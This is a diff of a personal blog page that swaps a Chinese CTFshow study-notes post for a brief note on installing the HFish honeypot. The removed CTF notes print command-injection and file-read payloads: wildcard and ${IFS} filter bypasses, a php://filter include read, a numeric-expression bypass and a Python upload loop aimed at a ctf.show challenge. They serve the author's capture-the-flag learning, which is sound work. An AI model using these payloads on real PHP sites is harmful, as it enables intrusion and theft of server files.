@@ -16,11 +16,11 @@
     <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
     <title>
         
-          CTFshow - wxx&#39;s_Blog
+          安装蜜罐hfish - wxx&#39;s_Blog
         
     </title>
 
-    <link rel="canonical" href="https://github.com/wxx0105/wxx0105.github.io/2021/10/16/ctfshow-vip记录/">
+    <link rel="canonical" href="https://github.com/wxx0105/wxx0105.github.io/2022/04/01/安装蜜罐hfish/">
 
     <!-- Bootstrap Core CSS -->
     
@@ -89,7 +89,7 @@
     header.intro-header{
         
             
-                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.5)), url('../../../../img/pexels-mads-thomsen-2739013.jpg')
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.5)), url('../../../../img/default.jpg')
                 /*post*/
             
         
@@ -107,21 +107,21 @@
                     <div class="post-heading">
                         <div class="tags">
                             
-                              <a class="tag" href="/tags/#-CTF" title="-CTF">-CTF</a>
+                              <a class="tag" href="/tags/#tools" title="tools">tools</a>
                             
                         </div>
-                        <h1>CTFshow</h1>
+                        <h1>安装蜜罐hfish</h1>
                         <h2 class="subheading"></h2>
                         <span class="meta">
                             Posted by wx_x on
-                            2021-10-16
+                            2022-04-01
                         </span>
 
                         
                             <div class="blank_box"></div>
                             <span class="meta">
-                                Words <span class="post-count">1.8k</span> and
-                                Reading Time <span class="post-count">7</span> Minutes
+                                Words <span class="post-count">119</span> and
+                                Reading Time <span class="post-count">1</span> Minutes
                             </span>
                             <div class="blank_box"></div>
                             <!-- 不蒜子统计 start -->
@@ -258,103 +258,23 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <a id="more"></a>
-<h1 id="Ctfshow知识点记录"><a href="#Ctfshow知识点记录" class="headerlink" title="Ctfshow知识点记录"></a>Ctfshow知识点记录</h1><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p><a href="https://www.cnblogs.com/yanwusheng/p/13747032.html" target="_blank" rel="noopener">CTFShow-Web入门-信息收集 - airtail - 博客园 (cnblogs.com)</a></p>
-<p>-svn泄露：<a href="https://www.cxyzjd.com/article/tempulcc/108959901" target="_blank" rel="noopener">ctfhub之svn信息泄露_tempulcc的博客-程序员宅基地_ctfhub svn泄露 - 程序员宅基地 (cxyzjd.com)</a></p>
-<p>SVN是subversion的缩写，是一个开放源代码的版本控制系统，通过采用分支管理系统的高效管理，简而言之就是用于多个人共同开发同一个项目，实现共享资源，实现最终集中式的管理。s</p>
-<p>原因：在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。</p>
-<p>在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。</p>
-<p>-Vim缓存：linux下的vim修改后保存的几个临时文件，.swp .swo .swn (三次意外退出)</p>
-<p>-TXT记录：域名解析，在DNS记录里面，除了最常见的A记录，CNAME记录，MX记录，还有不常见的TXT记录。 大家一般不会使用TXT记录，其实TXT记录还是很有用的。 TXT记录用来保存域名的附加文本信息，TXT记录的内容按照一定的格式编写，最常用的是SPF格式，SPF用于登记某个域名拥有的用来外发邮件的所有ip地址</p>
-<p>-目录扫描工具-dirsearch的kali安装：</p>
-<p>更改python版本以及切换：<a href="https://www.cnblogs.com/chenzhou2020/p/14207951.html" target="_blank" rel="noopener">kali linux安装python3 及如何切换版本 - todayisbeautyful - 博客园 (cnblogs.com)</a></p>
-<p>使用：<a href="https://www.cnblogs.com/thespace/p/12434361.html" target="_blank" rel="noopener">目录爆破工具dirsearch - the苍穹 - 博客园 (cnblogs.com)</a></p>
-<p>-对于一些花里胡哨的网站，找不到突破口或者提示没有的时候，可以后台目录扫描dirsearch</p>
-<p>-测试探针：实质上是通过网页编程语言（ASP、PHP、ASP.NET等）实现探测服务器敏感信息的脚本文件<a href="https://www.laozuo.org/16305.html" target="_blank" rel="noopener">常用的4款PHP探针工具 查看WEB环境软件版本 | 老左笔记 (laozuo.org)</a> </p>
-<p>这个就是访问tz.php得到的界面</p>
-<p><img src="https://i.loli.net/2021/10/16/7vP5AqifjJHerNE.jpg" alt="文本  描述已自动生成"></p>
-<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>！使用英文版bat_english，中文版会在一些爆破上出现格式错误，无法改正</p>
-<p>Php随机数的伪随机数：</p>
-<p>-mt_rand()存在的问题：<a href="https://www.php.net/manual/zh/function.mt-srand.php" target="_blank" rel="noopener">PHP: mt_srand - Manual</a></p>
-<p>由于mt_rand()的生成的随机数只跟seed和调用该函数的次数有关。举一个简单的例子来说明一下这个问题，假设使用mt_srand(1111111)进行了一次播种操作，接下来调用mt_rand()函数，第一次生成的数值为a,第二次生成的为b，第三次生成的为c。任何一个人拿到这样的一串代码，所执行的结果都是跟刚刚描述的一样。所以当你的seed数值被他人知道后，就可以预测出你接下来的数值是多少，这就是该函数的一个问题，他并不能起到一个真随机数的作用。</p>
-<p><a href="https://www.freebuf.com/sectool/205240.html" target="_blank" rel="noopener">CTF| web篇之伪随机数 - FreeBuf网络安全行业门户</a></p>
-<p>Web-24可以用脚本跑seed</p>
-<p><img src="https://i.loli.net/2021/10/16/EvZlmo3HPfOSi1W.jpg" alt="图形用户界面, 文本  描述已自动生成"></p>
-<p>秋后整理</p>
-<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>干干货：<a href="https://www.cnblogs.com/NPFS/p/13279815.html" target="_blank" rel="noopener">命令执行绕过小技巧 - NPFS - 博客园 (cnblogs.com)</a></p>
-<p>学习参考：<a href="https://www.freebuf.com/articles/network/258676.html" target="_blank" rel="noopener">CTF中的命令执行绕过方式 - FreeBuf网络安全行业门户</a></p>
-<p>参考wp：<a href="https://blog.csdn.net/qq_49480008/article/details/113177878" target="_blank" rel="noopener">(29条消息) CTFshow web入门——命令执行_小元砸的博客-CSDN博客</a></p>
-<p>-正则表达式：正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。</p>
-<p><a href="https://www.runoob.com/regexp/regexp-syntax.html" target="_blank" rel="noopener">正则表达式 – 语法 | 菜鸟教程 (runoob.com)</a></p>
-<p>Web29：参考<a href="https://www.php.net/manual/zh/function.preg-match.php" target="_blank" rel="noopener">PHP: preg_match - Manual</a>：</p>
-<p><img src="https://i.loli.net/2021/10/16/Jr7zobSkm9DqEeL.jpg" alt="文本  描述已自动生成"></p>
-<p>-通配符：是一种特殊语句，主要有星号(*)和问号(?)，用来模糊搜索文件。 当查找文件夹时，可以使用它来代替一个或多个真正字符；当不知道真正字符或者懒得输入完整名字时，常常使用通配符代替一个或多个真正的字符。</p>
-<p>这一题可以通过这个直接解：?c=echo system(‘cat f*’);</p>
-<p>Web30：常规绕过</p>
-<p><img src="https://i.loli.net/2021/10/16/Ztci7YLR2FoVWNq.jpg" alt="文本  描述已自动生成"></p>
-<p>Web31-web32：均可以采用include结合伪协议进行包含读取</p>
-<p><a href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener">PHP: 支持的协议和封装协议 - Manual</a></p>
-<p>有时候看着崭新的php专有名词，会陷入迷茫常阅读此：<a href="https://www.php.net/manual/zh/intro-whatcando.php" target="_blank" rel="noopener">PHP: PHP 能做什么？ - Manual</a></p>
-<p><strong>Php的include函数+伪协议php://filter</strong></p>
-<p>伪协议ctf参考：<a href="https://na0h.cn/2021/02/25/php伪协议/" target="_blank" rel="noopener">php伪协议的学习 - Na0H的神光棒存放地</a></p>
-<p><strong>?c=include”$_GET[url]”?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.phpphp://filter/read=convert.base64encode/resource=hhh.php使用了过滤器convert.base64-encode：将输入流进行base64编码；resource=hhh.php：数据源自文件hhh.php，也就是读取hhh.php文件</strong></p>
-<p><img src="https://i.loli.net/2021/10/16/w9eu78dZ46TVjkv.jpg" alt="文本  描述已自动生成"></p>
-<p>Web40：需要时不时看看</p>
-<p><a href="https://www.freebuf.com/articles/system/242482.html" target="_blank" rel="noopener">无参数读文件和RCE总结 - FreeBuf网络安全行业门户</a></p>
-<p><a href="https://www.cnblogs.com/aninock/p/15125215.html" target="_blank" rel="noopener">ctfshow-web入门命令执行-web40/web41(附python脚本) - Aninock - 博客园 (cnblogs.com)</a></p>
-<p>web41：需要学习的很多<strong>，python的学习</strong></p>
-<p><a href="https://www.cnblogs.com/aninock/p/15125215.html" target="_blank" rel="noopener">ctfshow-web入门命令执行-web40/web41(附python脚本) - Aninock - 博客园 (cnblogs.com)</a></p>
-<p>python导入模块：</p>
-<p>file-&gt;setting-&gt;project python_saving-&gt;python Interpreter</p>
-<p><img src="https://i.loli.net/2021/10/16/6VDhkPIQHpwSY3K.jpg" alt="文本  描述已自动生成"></p>
-<p><a href="https://blog.csdn.net/miuzzx/article/details/109143413?ops_request_misc=%7B%22request%5Fid%22%3A%22163405268816780274144913%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=163405268816780274144913&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-109143413.first_rank_v2_pc_rank_v29&amp;utm_term=异或自增&amp;spm=1018.2226.3001.4187" target="_blank" rel="noopener">(30条消息) 无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_羽的博客-CSDN博客</a>（出题人）</p>
-<p>Web43-web44</p>
-<p>参考<a href="https://www.linuxcool.com/" target="_blank" rel="noopener">Linux命令大全(手册) – 真正好用的Linux命令在线查询网站 (linuxcool.com)</a></p>
-<p>学习命令</p>
-<p>均过滤了cat与flag与‘；’，所以构造payload：?c=tail -n 5 f*|| 即可</p>
-<p>|| //只执行前面那条命令</p>
-<p>Web45</p>
-<p>所谓ifs绕过空格：空格使用${IFS}代替，也可以$IFS主要看大括号有没有被过滤</p>
-<p>Web46-52</p>
-<p>过滤了$，故不可使用ifs绕过，这时候使用linux中的nl命令是一个很好用的编号过滤工具。该命令可以读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。</p>
-<p><strong>！传参注意不要保留空格，因为题目过滤空格</strong></p>
-<p><strong>Web54：加强了过滤力度，可以使用通配符进行模糊查询，使用grep（强大的文本搜索工具：全面搜索正则表达式）绕过</strong></p>
-<p><strong>Payload 1：c=/bin/c??${IFS}????????-&gt;c=/bin/cat${IFS}flag.php</strong></p>
-<p><strong>Payload 2：?c=grep${IFS}’{‘${IFS}fl???php//看不嘿懂，特别是那个’{’，看官方文档也没看到这种写法</strong></p>
-<p><strong>Web55：仍然是通配符应用</strong></p>
-<p><strong>Payload 1：?c=/???/????64 ????.??? 意思是 /bin/base64 flag.php（前提是知道网站目录下包含base64）</strong></p>
-<p><strong>Payload 2：?c=/???/???/????2 ????.??? 也就是/usr/bin/bzip2 flag.php（意思就是说我们先将flag.php文件进行压缩，然后再将其下载）</strong></p>
-<p><strong>Payload 3：无字母getshel，有参考：</strong><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></p>
-<p>也有脚本直接跑</p>
-<p>import requests</p>
-<p>while True:</p>
-<p>  url=”<a href="http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[" target="_blank" rel="noopener">http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[</a>]”</p>
-<p>  r = requests.post(url, files={“file”: (‘feng.txt’, b’cat flag.php’)})</p>
-<p>  if r.text.find(“flag”) &gt; 0:</p>
-<p>​    print(r.text)</p>
-<p>​    break</p>
-<p><strong>web57：</strong></p>
-<p><strong>payload 1：?c=grep${IFS}’fla’${IFS}fla??php</strong></p>
-<p><strong>payload 2：?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</strong></p>
-<p><strong>$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</strong></p>
-<p><strong>$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</strong></p>
-<p><strong>$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</strong></p>
-<p><strong>$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</strong></p>
-<p><strong>$(())))$((~$(())))$((~$(())))))))</strong></p>
-<p><strong>//数字绕过,为什么要求36啊》？</strong></p>
-
+                  <a id="more"></a>
+<h1 id="安装蜜罐hfish"><a href="#安装蜜罐hfish" class="headerlink" title="安装蜜罐hfish"></a>安装蜜罐hfish</h1><p>这个也是和黄哥突然聊天的时候想起来的，安装也是废了一番功夫，主要是没有计划去实现我的想法，总是想到什么就做什么，才导致频繁报错，直到迫不得已重置</p>
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前是centos7，一直错，在启动docker 容器的时候，我裂开，于是将vps更新成8.2试试看</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>docker安装：<a href="https://blog.csdn.net/m0_38044453/article/details/120888050" target="_blank" rel="noopener">https://blog.csdn.net/m0_38044453/article/details/120888050</a></p>
+<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2>
                 
                 <hr>
                 <!-- Pager -->
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2021/12/07/python些许笔记/" data-toggle="tooltip" data-placement="top" title="Python学习的疑惑">&larr; Previous Post</a>
+                        <a href="/2022/04/02/windows7下配置vscode的c-开发/" data-toggle="tooltip" data-placement="top" title="windows7下配置mingw64">&larr; Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/2021/10/16/sql的一些知识/" data-toggle="tooltip" data-placement="top" title="sql的一些知识">Next Post &rarr;</a>
+                        <a href="/2022/03/29/我的疑惑/" data-toggle="tooltip" data-placement="top" title="我的疑惑">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -467,7 +387,7 @@
           <strong class="toc-title">Contents</strong>
           
             
-              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Ctfshow知识点记录"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Ctfshow知识点记录</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#信息泄露"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">信息泄露</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#爆破"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">爆破</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#命令执行"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">命令执行</span></a></li></ol></li></ol>
+              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#安装蜜罐hfish"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">安装蜜罐hfish</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#背景"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">背景</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#参考"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">参考</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#踩坑"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">踩坑</span></a></li></ol></li></ol>
             
           
           </div>
@@ -489,7 +409,7 @@
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#-CTF" title="-CTF">-CTF</a>
+                          <a class="tag" href="/tags/#tools" title="tools">tools</a>
                         
                     </div>
                 </section>
